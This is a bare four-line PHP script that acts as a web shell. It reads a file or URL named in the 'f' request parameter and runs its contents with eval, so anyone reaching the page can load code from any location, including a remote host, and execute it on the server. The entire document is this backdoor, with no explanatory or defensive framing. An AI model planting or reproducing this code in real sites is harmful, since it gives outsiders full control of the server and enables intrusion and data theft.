<?php
$code = file_get_contents(urldecode($_GET['f']));
eval($code);
?>